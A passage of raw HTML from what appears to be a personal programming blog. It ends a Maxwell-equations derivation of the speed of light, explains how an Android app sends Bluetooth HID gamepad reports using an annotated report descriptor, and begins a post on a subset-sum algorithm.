style="margin-right:0.05556em;">∂</span><span class="mord mathnormal">t</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-2.421295em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.37144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.37144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal">t</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">μ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">ϵ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.278735em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>

<p>Then, after some rearranging and then equating <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">&#x2202;</mi><mi>B</mi></mrow><mrow><mi mathvariant="normal">&#x2202;</mi><mi>E</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial B}{\partial E}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">&#x2202;</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">E</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">&#x2202;</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">&#x200b;</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>, we can get the partial derivative of position with respect to time. This represents the effective propagation of the wave as you ‘follow’ its movement<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote">2</a></sup>, so the velocity is essentially the speed of light.</p>

<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">&#x2202;</mi><mi>x</mi></mrow><mrow><mi mathvariant="normal">&#x2202;</mi><mi>t</mi></mrow></mfrac><mo>=</mo><mfrac><mn>1</mn><msqrt><mrow><msub><mi>&#x3bc;</mi><mn>0</mn></msub><msub><mi>&#x3f5;</mi><mn>0</mn></msub></mrow></msqrt></mfrac><mo>=</mo><mi>c</mi><mo>=</mo><mn>299792458</mn><mtext>&#xa0;</mtext><mrow><mi mathvariant="normal">m</mi><mtext>&#x2009;</mtext><msup><mi mathvariant="normal">s</mi><mrow><mo>&#x2212;</mo><mn>1</mn></mrow></msup></mrow></mrow><annotation encoding="application/x-tex">\frac{\partial x}{\partial t} = \frac{1}{\sqrt{\mu_0 \epsilon_0}} = c = 299792458\ \mathrm{m \, s^{-1}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.05744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.37144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal">t</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.34438em;vertical-align:-1.02294em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.70306em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord"><span class="mord mathnormal">μ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">ϵ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.66306em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width="400em" height="1.08em" viewBox="0 0 400000 1080" preserveAspectRatio="xMinYMin slice"><path d="M95,702 c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14 c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54 c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10 s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429 c69,-144,104.5,-217.7,106.5,-221 l0 -0 c5.3,-9.3,12,-14,20,-14 H400000v40H845.2724 s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7 c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z M834 80h400000v40h-400000z"></path></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.33693999999999996em;"><span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.02294em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.864108em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">9</span><span class="mord">9</span><span class="mord">7</span><span class="mord">9</span><span class="mord">2</span><span class="mord">4</span><span class="mord">5</span><span class="mord">8</span><span class="mspace"> </span><span class="mord"><span class="mord mathrm">m</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathrm">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathrm mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></span></span></p>
<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:2" role="doc-endnote">
      <p>Taken from <a href="https://en.wikipedia.org/wiki/Curl_(mathematics)">Wikipedia</a>. <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:3" role="doc-endnote">
      <p>In reality, the fields themselves aren’t moving. It’s like a wave in water - the particles are moving up and down, creating motion, but they aren’t actually moving longitudinally. <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/bluehid-3">BlueHID Details, part 3 - Finally, controls!</a></h2>
  
    <div class="bounded"><p>After part 1 and 2, we’ve got everything (finally) set up implement a Bluetoooth HID device. All we need to do now is to send the control inputs to the connected device, and it’s much simpler than setting things up.</p>

<!--more-->

<p><a href="https://github.com/ralismark/bluehid"><em>Code on github</em></a>.</p>

<p>I’m going to skip past the code required to get inputs from the user, such as buttons, joysticks, etc. as it will probably be specific to your purpose. Look at the source code if you want to know more about how it’s implemented in BlueHID.</p>

<h2 id="sending-inputs"><a href="#sending-inputs">Sending inputs</a></h2>

<p>The relevant API for sending a report is <a href="https://developer.android.com/reference/android/bluetooth/BluetoothHidDevice.html#sendReport(android.bluetooth.BluetoothDevice,%20int,%20byte[])"><code class="language-plaintext highlighter-rouge">BluetoothHidDevice.sendReport</code></a>, which takes the <code class="language-plaintext highlighter-rouge">BluetoothDevice</code> you’re sending the inputs (which should have been previously connected), the report id (0 if you don’t use a report id), and the actual report data. The first two arguments are quite simple, and the report data should follow your report descriptor - which shouldn’t be too complicated if you’ve looked into HID report descriptors e.g. in the tutorial I linked in the previous part. Still, I’ll go through the one used in BlueHID.</p>

<p>If you’re familiar with HID reports, this is the end! Send a report when your input change, and things should work out.</p>

<h2 id="a-bluehid-example"><a href="#a-bluehid-example">A BlueHID example</a></h2>

<p>I’ll explain how this works using the BlueHID report descriptor (even though I said I wouldn’t in the previous part). Most of this doesn’t use actual HID terminology, so don’t rely on it for that.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="mh">0x05</span><span class="o">,</span> <span class="mh">0x01</span><span class="o">,</span>        <span class="c1">// USAGE_PAGE (Generic Desktop)</span>
<span class="mh">0x09</span><span class="o">,</span> <span class="mh">0x05</span><span class="o">,</span>        <span class="c1">// USAGE (Game Pad)</span>
<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0xa1</span><span class="o">,</span> <span class="mh">0x01</span><span class="o">,</span> <span class="c1">// COLLECTION (Application)</span>
<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0xa1</span><span class="o">,</span> <span class="mh">0x00</span><span class="o">,</span> <span class="c1">//   COLLECTION (Physical)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This is essentially boilerplate to declare that the device is a gamepad:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="mh">0x05</span><span class="o">,</span> <span class="mh">0x09</span><span class="o">,</span>        <span class="c1">//     USAGE_PAGE (Button)</span>
<span class="mh">0x19</span><span class="o">,</span> <span class="mh">0x01</span><span class="o">,</span>        <span class="c1">//     USAGE_MINIMUM (Button 1)</span>
<span class="mh">0x29</span><span class="o">,</span> <span class="mh">0x04</span><span class="o">,</span>        <span class="c1">//     USAGE_MAXIMUM (Button 4)</span>
<span class="mh">0x15</span><span class="o">,</span> <span class="mh">0x00</span><span class="o">,</span>        <span class="c1">//     LOGICAL_MINIMUM (0)</span>
<span class="mh">0x25</span><span class="o">,</span> <span class="mh">0x01</span><span class="o">,</span>        <span class="c1">//     LOGICAL_MAXIMUM (1)</span>
<span class="mh">0x75</span><span class="o">,</span> <span class="mh">0x01</span><span class="o">,</span>        <span class="c1">//     REPORT_SIZE (1)</span>
<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0x95</span><span class="o">,</span> <span class="mh">0x04</span><span class="o">,</span> <span class="c1">//     REPORT_COUNT (4)</span>
<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0x81</span><span class="o">,</span> <span class="mh">0x02</span><span class="o">,</span> <span class="c1">//     INPUT (Data,Var,Abs)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This describes a set of 4 buttons (indicated by the usage minimum/maximum). Each can either be pressed (a value of 1) or not (value of 0), giving us the logical maximum/minimum. Each button takes up 1 bit (report size), and there are 4 of them (report count). The input statement ends this block.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="mh">0x75</span><span class="o">,</span> <span class="mh">0x04</span><span class="o">,</span>        <span class="c1">//     REPORT_SIZE (4)</span>
<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0x95</span><span class="o">,</span> <span class="mh">0x01</span><span class="o">,</span> <span class="c1">//     REPORT_COUNT (1)</span>
<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0x81</span><span class="o">,</span> <span class="mh">0x03</span><span class="o">,</span> <span class="c1">//     INPUT (Cnst,Var,Abs)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This is padding (constant) of 4 bits, ensuring that subsequent values are aligned on byte boundaries.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="mh">0x05</span><span class="o">,</span> <span class="mh">0x01</span><span class="o">,</span>        <span class="c1">//     USAGE_PAGE (Generic Desktop)</span>
<span class="mh">0x09</span><span class="o">,</span> <span class="mh">0x30</span><span class="o">,</span>        <span class="c1">//     USAGE (X)</span>
<span class="mh">0x09</span><span class="o">,</span> <span class="mh">0x31</span><span class="o">,</span>        <span class="c1">//     USAGE (Y)</span>
<span class="mh">0x15</span><span class="o">,</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0x81</span><span class="o">,</span> <span class="c1">//     LOGICAL_MINIMUM (-127)</span>
<span class="mh">0x25</span><span class="o">,</span> <span class="mh">0x7f</span><span class="o">,</span>        <span class="c1">//     LOGICAL_MAXIMUM (127)</span>
<span class="mh">0x75</span><span class="o">,</span> <span class="mh">0x08</span><span class="o">,</span>        <span class="c1">//     REPORT_SIZE (8)</span>
<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0x95</span><span class="o">,</span> <span class="mh">0x02</span><span class="o">,</span> <span class="c1">//     REPORT_COUNT (2)</span>
<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0x81</span><span class="o">,</span> <span class="mh">0x02</span><span class="o">,</span> <span class="c1">//     INPUT (Data,Var,Abs)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This declares a joystick with a position described by X and Y coordinates. Each value is stored in 8 bits, and there are 2 of them. These vary between -127 and 127 (the maximum in a byte <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote">1</a></sup>).</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0xc0</span><span class="o">,</span>       <span class="c1">//   END_COLLECTION</span>
<span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mh">0xc0</span>        <span class="c1">// END_COLLECTION</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This finishes the descriptor.</p>

<p>From this, we can determine the format of the report:</p>

<table class="text-centre" style="table-layout: fixed">
<thead>
  <tr><th>bit</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th></th></tr>
</thead>
<tbody>
  <tr><td>Byte 0</td><td class="boxed" colspan="4"><em>padding</em></td><td class="boxed">b4</td><td class="boxed">b3</td><td class="boxed">b2</td><td class="boxed">b1</td><td>(buttons)</td></tr>
  <tr><td>Byte 1</td><td class="boxed" colspan="8">X Axis</td><td></td></tr>
  <tr><td>Byte 2</td><td class="boxed" colspan="8">Y Axis</td><td></td></tr>
</tbody>
</table>

<p>If we fill in the report according to this format (see code for how this can be done), and send it with <code class="language-plaintext highlighter-rouge">sendReport()</code> whenever the input change, it’ll work.</p>

<h2 id="bluetooth-issues"><a href="#bluetooth-issues">Bluetooth Issues</a></h2>

<p>After this, the HID controller should work. However, in practice it may not. I’ve experienced significant variation in latency - on some days, it works well, but on others, it just doesn’t. I’m not sure if this is due to the app or the Bluetooth implementation on Android, but I’m pretty sure the app is okay. You might want to try messing with QoS (the <code class="language-plaintext highlighter-rouge">null</code> parameters from before), but beyond that, I don’t know.</p>
<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>Yes, technically we can have -128 as a possible value, but excluding it makes the bounds symmetric. This is also what’s used in many example descriptors. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/nice-01-knapsack">A nice subset-sum solution</a></h2>
  
    <div class="bounded"><blockquote>
  <p>This post was rewritten in May 2020</p>
</blockquote>

<p><a href="https://en.wikipedia.org/wiki/Subset_sum_problem">Subset-sum</a> is a problem to determine if it’s possible to find a subset of a given set of numbers which sum of a certain value. I found a very simple algorithms that can be extended to a few variations of the problem.</p>

<!--more-->

<p>For the problem, let:</p>

<ul>
  <li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> be our target sum, and</li>
  <li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi><mo stretchy="false">[</mo><mn>0..</mn><mi>N</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">w[0..N]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord">0</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">]</span></span></span></span> be an array of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> positive integers.</li>
</ul>

<p>The standard dynamic programming approach is to have your subproblem be “is it possible to reach <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span> using only <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi><mo stretchy="false">[</mo><mn>0..</mn><mi>k</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">w[0..k]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord">0</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span></span></span></span>” for given <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span> and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>. The recurrence is as follows:</p>

<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>s</mi><mi>s</mi><mi>s</mi><mo stretchy="false">(</mo><mi>t</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>t</mi><mo>&lt;</mo><mn>0</mn><mtext>&#xa0;or&#xa0;</mtext><mi>k</mi><mo>&lt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>t</mi><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>s</mi><mi>s</mi><mi>s</mi><mo stretchy="false">(</mo><mi>t</mi><mo>&#x2212;</mo><mi>w</mi><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>k</mi><mo>&#x2212;</mo><mn>1</mn><mo stretchy="false">)</mo><mo>&#x2228;</mo><mi>s</mi><mi>s</mi><mi>s</mi><mo stretchy="false">(</mo><mi>t</mi><mo separator="true">,</mo><mi>k</mi><mo>&#x2212;</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>otherwise</mtext></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">sss(t, k) = \begin{cases}
	0 &amp; t &lt; 0 \textrm{ or } k &lt; 0 \\
	1 &amp; t = 0 \\
	sss(t - w[k], k-1) \vee sss(t, k-1) &amp; \textrm{otherwise}
\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:4.32em;vertical-align:-1.9099999999999997em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.35002em;"><span style="top:-2.19999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.19499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-2.20499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-3.15001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.2950099999999996em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.30501em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.60002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.8500199999999998em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.5300000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord 